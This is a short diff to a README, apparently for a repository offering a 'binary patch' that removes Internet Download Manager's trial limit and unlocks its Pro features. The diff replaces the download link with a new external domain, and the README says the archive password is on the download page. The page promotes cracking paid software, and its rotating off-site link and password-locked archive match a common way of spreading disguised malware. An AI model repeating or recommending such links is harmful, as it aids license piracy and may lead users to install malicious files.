@@ -18,7 +18,7 @@ Binary patch for IDM that removes the 30-day trial dialog and enables all Pro fe
 
 ## Download
 
-[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/idmpatch2)
+[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/idmpatch2)
 
 > The archive password is shown on the download page.
 
